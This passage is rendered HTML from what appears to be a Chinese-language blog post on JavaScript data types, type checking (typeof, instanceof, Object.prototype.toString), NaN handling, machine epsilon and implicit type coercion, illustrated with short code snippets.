，以数字作为上下文。</p>\n<blockquote>\n<p>其中一个操作数是字符串（或者通过 <code>ToPrimitive</code> 得到字符串），则执行字符串拼接，否则执行数字加法</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = &#123;</span><br><span class=\"line\">  valueOf: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">42</span>;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  toString: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">4</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">a + <span class=\"string\">&quot;&quot;</span>; <span class=\"comment\">// &quot;42&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">String</span>(a); <span class=\"comment\">// &quot;4&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// a + &quot;&quot; 会对 a 调用 valueOf() 方法，然后通过 ToString 抽象操作将返回值转换为字符串。</span></span><br><span class=\"line\"><span class=\"comment\">// String(a) 则是直接调用 ToString()</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"number\">1</span>, <span class=\"number\">2</span>] + [<span class=\"number\">3</span>, <span class=\"number\">4</span>] <span class=\"comment\">// &#x27;1,23,4&#x27;</span></span><br><span class=\"line\"><span class=\"number\">42</span> + <span class=\"string\">&#x27;&#x27;</span> <span class=\"comment\">// &#x27;42&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">[] + &#123;&#125; <span class=\"comment\">// &#x27;[object Object]&#x27;</span></span><br><span class=\"line\">&#123; &#125; +[] <span class=\"comment\">// 0 `&#123;&#125;` 被当做代码块</span></span><br><span class=\"line\"></span><br><span class=\"line\">  + <span class=\"string\">&#x27;42&#x27;</span> <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"string\">&#x27;42&#x27;</span> - <span class=\"number\">0</span> <span class=\"comment\">// 42</span></span><br><span class=\"line\"><span class=\"string\">&#x27;42&#x27;</span> - <span class=\"string\">&#x27;12&#x27;</span> <span class=\"comment\">// 32</span></span><br><span class=\"line\"></span><br><span class=\"line\">[<span class=\"number\">32</span>] - [<span class=\"number\">21</span>] <span class=\"comment\">// 11</span></span><br><span class=\"line\">  [<span class=\"number\">32</span>] - [<span class=\"number\">2</span>, <span class=\"number\">1</span>] <span class=\"comment\">// NaN</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"隐式强制转换为-Number\"><a href=\"#隐式强制转换为-Number\" class=\"headerlink\" title=\"隐式强制转换为 Number\"></a>隐式强制转换为 Number</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// boolean 转换为 number</span></span><br><span class=\"line\"><span class=\"comment\">// 也可使用 Number(boolean) 进行隐式转换</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">booleanToNum</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"built_in\">arguments</span>.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">arguments</span>[i]) &#123;</span><br><span class=\"line\">      sum += <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">booleanToNum(<span class=\"literal\">true</span>, <span class=\"literal\">false</span>, <span class=\"literal\">true</span>)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"隐式强制转换为Boolean\"><a href=\"#隐式强制转换为Boolean\" class=\"headerlink\" title=\"隐式强制转换为Boolean\"></a>隐式强制转换为Boolean</h5><p>下面的情况会发生隐式强制类型 Boolean 转换：</p>\n<ol>\n<li>if (..) 语句中的条件判断表达式。</li>\n<li>for ( .. ; .. ; .. ) 语句中的条件判断表达式（第二个）。</li>\n<li>while (..) 和 do..while(..) 循环中的条件判断表达式。</li>\n<li>? :中的条件判断表达式。</li>\n<li>逻辑运算符 || （逻辑或）和 &amp;&amp; （逻辑与）左边的操作数（作为条件判断表达式）。</li>\n</ol>\n<pre><code class=\"js\">var a = 42;\nvar b = &quot;abc&quot;;\nvar c;\nvar d = null;\nif (a) &#123;\n  console.log(&quot;yep&quot;); // yep\n&#125;\nwhile (c) &#123;\n  console.log(&quot;nope, never runs&quot;);\n&#125;\nc = d ? a : b;\nc; // &quot;abc&quot;\nif ((a &amp;&amp; d) || c) &#123;\n  console.log(&quot;yep&quot;); // yep\n&#125;```\n</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1、数据类型\"><a href=\"#1、数据类型\" class=\"headerlink\" title=\"1、数据类型\"></a>1、数据类型</h3><p>八种数据类型：<code>null</code> 、 <code>undefined</code> 、 <code>boolean</code> 、 <code>number</code> 、 <code>string</code> 、 <code>symbol</code>、<code>bigint</code> 和 <code>object</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"literal\">undefined</span> === <span class=\"string\">&#x27;undefined&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"literal\">true</span> === <span class=\"string\">&#x27;boolean&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"number\">42</span> === <span class=\"string\">&#x27;number&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"string\">&#x27;42&#x27;</span> === <span class=\"string\">&#x27;string&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> &#123; <span class=\"attr\">life</span>: <span class=\"number\">42</span> &#125; === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> [<span class=\"number\">1</span>] === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 历史遗留问题</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"literal\">null</span> === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ES6中新加入的类型</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"built_in\">Symbol</span>() === <span class=\"string\">&#x27;symbol&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"number\">12n</span> === <span class=\"string\">&#x27;bigint&#x27;</span> <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"1-1-类型判断\"><a href=\"#1-1-类型判断\" class=\"headerlink\" title=\"1.1 类型判断\"></a>1.1 类型判断</h5><h6 id=\"1-1-1-typeof\"><a href=\"#1-1-1-typeof\" class=\"headerlink\" title=\"1.1.1 typeof\"></a>1.1.1 typeof</h6><p>typeof 命令可以判断 Undefined, Boolean, String, Number, Symbol, BigInt 等基本数据类型，但无法判断 Null，Object, Array 等对象类型</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typeof</span> <span class=\"literal\">null</span> === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> &#123;&#125; === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"keyword\">typeof</span> [] === <span class=\"string\">&#x27;object&#x27;</span>; <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<h6 id=\"1-1-2-instanceof-（不推荐使用）\"><a href=\"#1-1-2-instanceof-（不推荐使用）\" class=\"headerlink\" title=\"1.1.2 instanceof （不推荐使用）\"></a>1.1.2 instanceof （不推荐使用）</h6><p>适合用于判断自定义的类实例对象, 而不是用来判断原生的数据类型，会有一些问题，不推荐使用</p>\n<p>实质上是通过 constructor 字段来判断的，会逐层的在原型链上查找</p>\n<blockquote>\n<p>iframe 之间不会共享原型链，通过 iframe 传值时，使用 instanceof 会有问题</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = []</span><br><span class=\"line\">arr <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Array</span> <span class=\"comment\">// true</span></span><br><span class=\"line\">arr <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Object</span> <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<h6 id=\"1-1-3-Object-prototype-toString-（推荐使用）\"><a href=\"#1-1-3-Object-prototype-toString-（推荐使用）\" class=\"headerlink\" title=\"1.1.3 Object.prototype.toString() （推荐使用）\"></a>1.1.3 Object.prototype.toString() （推荐使用）</h6><p>Object.prototype.toString 方法, 可以获取到变量的准确的类型</p>\n<blockquote>\n<p><code>Object.prototype.toString</code> 的原理是当调用的时候, 就取值内部的 <code>[[Class]]</code> 属性值, 然后拼接成 <code>&#39;[object &#39; + [[Class]] + &#39;]&#39;</code> 这样的字符串并返回</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> fn = <span class=\"function\">() =&gt;</span> &#123;&#125;;</span><br><span class=\"line\"><span class=\"keyword\">const</span> toString = <span class=\"built_in\">Object</span>.prototype.toString;</span><br><span class=\"line\"></span><br><span class=\"line\">toString.call(<span class=\"literal\">undefined</span>); <span class=\"comment\">// [object Undefined]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">null</span>); <span class=\"comment\">// [object Null]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">true</span>); <span class=\"comment\">// [object Boolean]</span></span><br><span class=\"line\">toString.call(<span class=\"number\">1</span>);  <span class=\"comment\">// [object Number]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">NaN</span>); <span class=\"comment\">// [object Number]</span></span><br><span class=\"line\">toString.call(<span class=\"string\">&#x27;1&#x27;</span>); <span class=\"comment\">// [object String]</span></span><br><span class=\"line\">toString.call(fn);  <span class=\"comment\">// [object Function]</span></span><br><span class=\"line\">toString.call([<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]); <span class=\"comment\">// [object Array]</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 实现 typeof 函数判断所有数据类型</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> typeOf = <span class=\"function\">(<span class=\"params\">obj</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> regex = <span class=\"regexp\">/\\[object\\s(.+)]/</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> objStr = <span class=\"built_in\">Object</span>.prototype.toString.call(obj);</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = objStr.match(regex);</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(res);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!res || !res[<span class=\"number\">1</span>]) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;typeof error&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> res[<span class=\"number\">1</span>].toLowerCase();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"1-1-4-其他-API\"><a href=\"#1-1-4-其他-API\" class=\"headerlink\" title=\"1.1.4 其他 API\"></a>1.1.4 其他 API</h6><p><strong>Array.isArray()</strong> 用于判断某个数据是否为数组，</p>\n<p>polyfill 实现如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Array</span>.isArray = <span class=\"built_in\">Array</span>.isArray || <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">array</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.prototype.toString.call(array) === <span class=\"string\">&#x27;[object Array]&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>Number.isNaN()</strong> 方法确定传递的值是否为 <code>NaN</code>，并且检查其类型是否为 <code>Number</code>。</p>\n<p>polyfill 实现如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Number</span>.isNaN = <span class=\"built_in\">Number</span>.isNaN || <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> value === <span class=\"string\">&quot;number&quot;</span> &amp;&amp; <span class=\"built_in\">isNaN</span>(value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>isNaN()</strong> 方法用来确定一个值是否为 <code>NaN</code>，因为 <code>NaN !== NaN</code></p>\n<blockquote>\n<p>将某些不能强制转换为数值的非数值转换为数值，或者算术运算返回一个未定义的或无法表示的值，会得到 <code>NaN</code><br>如果 <code>isNaN</code> 函数的参数不是 Number 类型， <code>isNaN</code> 函数会首先尝试将这个参数转换为数值，然后才会对转换后的结果是否是 <code>NaN</code> 进行判断，推荐使用 <strong>Number.isNaN()</strong></p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">isNaN</span> = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> n = <span class=\"built_in\">Number</span>(value);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> n !== n;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"1-2-undefined-与-undeclared\"><a href=\"#1-2-undefined-与-undeclared\" class=\"headerlink\" title=\"1.2 undefined 与 undeclared\"></a>1.2 undefined 与 undeclared</h3><ul>\n<li>未被声明的变量，如 <code>b</code>，调用时报错 <code>ReferenceError: b is not defined</code></li>\n<li>已被声明但未赋值的变量，如 <code>let a</code>， 直接调用时输出 <code>undefined</code></li>\n<li><code>typeof</code> 有一个特殊的安全防范机制，变量未被声明时也返回 <code>undefined</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> &#123; log &#125; = <span class=\"built_in\">console</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a;</span><br><span class=\"line\"></span><br><span class=\"line\">log(a); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">log(b); <span class=\"comment\">// ReferenceError: b is not defined</span></span><br><span class=\"line\">log(<span class=\"keyword\">typeof</span> a); <span class=\"comment\">// undefined</span></span><br><span class=\"line\">log(<span class=\"keyword\">typeof</span> b); <span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"1-3-机器精度\"><a href=\"#1-3-机器精度\" class=\"headerlink\" title=\"1.3 机器精度\"></a>1.3 机器精度</h5><p>比较两个浮点数最常见的方法是设置一个误差范围值，通常称为“机器精度”，对 JavaScript 的数字来说，这个值通常是 <code>2^-52</code> (2.220446049250313e-16) 。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 为 ES6 之前的版本写 polyfill</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"built_in\">Number</span>.EPSILON) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">Number</span>.EPSILON = <span class=\"built_in\">Math</span>.pow(<span class=\"number\">2</span>, -<span class=\"number\">52</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">numbersCloseEnoughToEqual</span>(<span class=\"params\">n1,n2</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.abs( n1 - n2 ) &lt; <span class=\"built_in\">Number</span>.EPSILON;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">0.1</span> + <span class=\"number\">0.2</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"number\">0.3</span>;</span><br><span class=\"line\">numbersCloseEnoughToEqual(a, b); <span class=\"comment\">// true</span></span><br><span class=\"line\">numbersCloseEnoughToEqual(<span class=\"number\">0.0000001</span>, <span class=\"number\">0.0000002</span>); <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Q: 去数值的整数部分和小数部分</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A: 使用 parseInt</span></span><br><span class=\"line\"><span class=\"comment\">// 不推荐使用，不准确 &amp; 性能问题</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">3.5</span></span><br><span class=\"line\"><span class=\"built_in\">parseInt</span>(a) <span class=\"comment\">// 3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"number\">0.0000000000001</span> <span class=\"comment\">// 1e-13</span></span><br><span class=\"line\"><span class=\"built_in\">parseInt</span>(b) <span class=\"comment\">// 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A: 使用 Math.ceil()、Math.floor()</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">trunc</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(num &gt;= <span class=\"number\">0</span>) <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.floor(num);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">Math</span>.ceil(num);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">trunc(<span class=\"number\">3.75</span>); <span class=\"comment\">// 3</span></span><br><span class=\"line\">trunc(-<span class=\"number\">3.75</span>); <span class=\"comment\">// -3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A: 使用 % 运算</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"number\">3.75</span> % <span class=\"number\">1</span>); <span class=\"comment\">// 0.75</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(-<span class=\"number\">3.75</span> % <span class=\"number\">1</span>); <span class=\"comment\">// -0.75</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// A: 使用位运算</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(~~<span class=\"number\">3.75</span>); <span class=\"comment\">// 3</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(~~-<span class=\"number\">3.75</span>); <span class=\"comment\">// -3</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"todo-取整数部分和小数部分\"><a href=\"#todo-取整数部分和小数部分\" class=\"headerlink\" title=\"todo: 取整数部分和小数部分\"></a>todo: 取整数部分和小数部分</h5><h3 id=\"2、对象、字符串、数字和布尔值之间类型转换规则\"><a href=\"#2、对象、字符串、数字和布尔值之间类型转换规则\" class=\"headerlink\" title=\"2、对象、字符串、数字和布尔值之间类型转换规则\"></a>2、对象、字符串、数字和布尔值之间类型转换规则</h3><h5 id=\"2-1-内部属性-class\"><a href=\"#2-1-内部属性-class\" class=\"headerlink\" title=\"2.1 内部属性 [[class]]\"></a>2.1 内部属性 [[class]]</h5><p>所有 <code>typeof</code> 返回值为 <code>&quot;object&quot;</code> 的对象都包含一个内部属性 <code>[[Class]]</code> （看作一个内部的分类），这个属性无法直接访问，一般通过 <code>Object.prototype.toString()</code> 来查看</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> toString = <span class=\"built_in\">Object</span>.prototype.toString;</span><br><span class=\"line\"></span><br><span class=\"line\">toString.call(<span class=\"literal\">null</span>); <span class=\"comment\">// [object Null]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">undefined</span>); <span class=\"comment\">// [object Undefined]</span></span><br><span class=\"line\">toString.call(<span class=\"literal\">true</span>); <span class=\"comment\">// [object Boolean]</span></span><br><span class=\"line\">toString.call([]); <span class=\"comment\">// [object Array]</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-2-toStringTag\"><a href=\"#2-2-toStringTag\" class=\"headerlink\" title=\"2.2 toStringTag\"></a>2.2 toStringTag</h5><p><code>Symbol.toStringTag</code> 是一个内置 <code>symbol</code>，它通常作为对象的属性键使用，对应的属性值应该为字符串类型，这个字符串用来表示该对象的自定义类型标签，通常只有内置的 <code>Object.prototype.toString()</code> 方法会去读取这个标签并把它包含在自己的返回值里。</p>\n<p>许多内置的 JavaScript 对象类型即便没有 <code>toStringTag</code> 属性，也能被 <code>toString()</code> 方法识别并返回特定的类型标签，比如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"string\">&#x27;foo&#x27;</span>);     <span class=\"comment\">// &quot;[object String]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call([<span class=\"number\">1</span>, <span class=\"number\">2</span>]);    <span class=\"comment\">// &quot;[object Array]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"number\">3</span>);         <span class=\"comment\">// &quot;[object Number]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"literal\">true</span>);      <span class=\"comment\">// &quot;[object Boolean]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"literal\">undefined</span>); <span class=\"comment\">// &quot;[object Undefined]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"literal\">null</span>);      <span class=\"comment\">// &quot;[object Null]&quot;</span></span><br><span class=\"line\"><span class=\"comment\">// ... and more</span></span><br></pre></td></tr></table></figure>\n\n<p>另外一些对象类型则不然，<code>toString()</code> 方法能识别它们是因为引擎为它们设置好了 <code>toStringTag</code> 标签：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"keyword\">new</span> <span class=\"built_in\">Map</span>());       <span class=\"comment\">// &quot;[object Map]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"function\"><span class=\"keyword\">function</span>* (<span class=\"params\"></span>) </span>&#123;&#125;); <span class=\"comment\">// &quot;[object GeneratorFunction]&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"built_in\">Promise</span>.resolve()); <span class=\"comment\">// &quot;[object Promise]&quot;</span></span><br><span class=\"line\"><span class=\"comment\">// ... and more</span></span><br></pre></td></tr></table></figure>\n\n<p>但你自己创建的类不会有这份特殊待遇，<code>toString()</code> 找不到 <code>toStringTag</code> 属性时只好返回默认的 Object 标签：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ValidatorClass</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.prototype.toString.call(<span class=\"keyword\">new</span> ValidatorClass()); <span class=\"comment\">// &quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>加上 <code>toStringTag</code> 属性，你的类也会有自定义的类型标签了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 